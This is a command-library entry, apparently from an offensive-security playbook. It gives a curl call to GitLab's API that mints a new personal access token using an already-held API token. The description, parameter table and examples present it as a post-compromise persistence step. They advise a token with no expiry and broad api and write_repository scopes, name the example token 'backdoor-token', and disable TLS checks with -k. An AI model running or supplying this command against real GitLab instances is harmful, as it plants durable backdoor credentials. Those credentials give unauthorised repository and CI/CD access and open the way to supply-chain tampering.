---
id: 3d6de3eb-4de8-496d-a50c-7300ecc81e3f
name: gitlab-create-personal-access-token
type: command
executor: bash
data: >-
  curl -k --request POST --header "PRIVATE-TOKEN: $_API_TOKEN" --data
  "name=$_TOKEN_NAME" --data "expires_at=" --data "scopes[]=api" --data
  "scopes[]=read_repository" --data "scopes[]=write_repository"
  "https://$_GITLAB_HOST/api/v4/users/$_USER_ID/personal_access_tokens"
output: null
created_at: '2023-04-06T03:56:25.247231+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - macOS
tags:
  - gitlab
  - api
  - token
verified: true
validated: true
---

# gitlab-create-personal-access-token

## Command

```bash
curl -k --request POST --header "PRIVATE-TOKEN: $_API_TOKEN" --data "name=$_TOKEN_NAME" --data "expires_at=" --data "scopes[]=api" --data "scopes[]=read_repository" --data "scopes[]=write_repository" "https://$_GITLAB_HOST/api/v4/users/$_USER_ID/personal_access_tokens"
```

## Description

This command uses curl to create a new Personal Access Token (PAT) in GitLab via the API, leveraging an existing API token for authentication. It is used in persistence scenarios after initial compromise to generate a long-lived token for ongoing access to repositories and CI/CD features.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_API_TOKEN | Existing GitLab API token for authentication (PRIVATE-TOKEN header) | Yes |
| $_TOKEN_NAME | Name for the new PAT (e.g., user-persistence-token) | Yes |
| expires_at= | Leave blank for no expiration (or set a date like 2024-12-31T00:00:00Z) | No |
| scopes[]=api | Grants full API access | Yes |
| scopes[]=read_repository | Allows reading repositories | Yes |
| scopes[]=write_repository | Allows writing/modifying repositories | Yes |
| $_GITLAB_HOST | GitLab instance URL (e.g., gitlab.example.com) | Yes |
| $_USER_ID | Numeric ID of the target user | Yes |
| -k | Ignores SSL certificate validation (use cautiously) | No |

## Examples

### Basic Usage

```bash
curl -k --request POST --header "PRIVATE-TOKEN: glpat-ABC123" --data "name=backdoor-token" --data "expires_at=" --data "scopes[]=api" --data "scopes[]=read_repository" --data "scopes[]=write_repository" "https://gitlab.example.com/api/v4/users/12345/personal_access_tokens"
```

### Advanced Usage

Add more scopes like `scopes[]=write_api` for broader access:

```bash
curl -k --request POST --header "PRIVATE-TOKEN: $_API_TOKEN" --data "name=$_TOKEN_NAME" --data "expires_at=" --data "scopes[]=api" --data "scopes[]=read_repository" --data "scopes[]=write_repository" --data "scopes[]=write_api" "https://$_GITLAB_HOST/api/v4/users/$_USER_ID/personal_access_tokens"
```

## Expected Output

Successful execution returns JSON with the new token details:

```json
{
  "id": 67890,
  "token": "glpat-XXXXXXXXXXXXXXXXXXXX",
  "name": "user-persistence-token",
  "revoked": false,
  "created_at": "2023-10-01T12:00:00.000Z",
  "scopes": ["api", "read_repository", "write_repository"]
}
```

Errors include 401 (invalid initial token) or 403 (insufficient privileges).

## Related

- [[procedures/Create-Persistent-GitLab-Personal-Access-Token-for-Compromise]]
- [[commands/gitlab-verify-api-token]]
